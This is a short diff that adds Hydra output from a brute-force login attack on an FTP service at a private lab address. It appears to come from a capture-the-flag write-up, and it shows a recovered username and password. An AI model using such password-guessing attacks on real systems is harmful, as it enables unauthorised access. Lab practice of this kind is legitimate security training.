@@ -1,0 +1,6 @@
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 4021 login tries (l:1/p:4), ~1 try per task
+[DATA] attacking ftp://10.10.196.172:21/
+[21][ftp] host: 10.10.196.172   login: chris   password: crystal
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-11-18 20:16:20
+
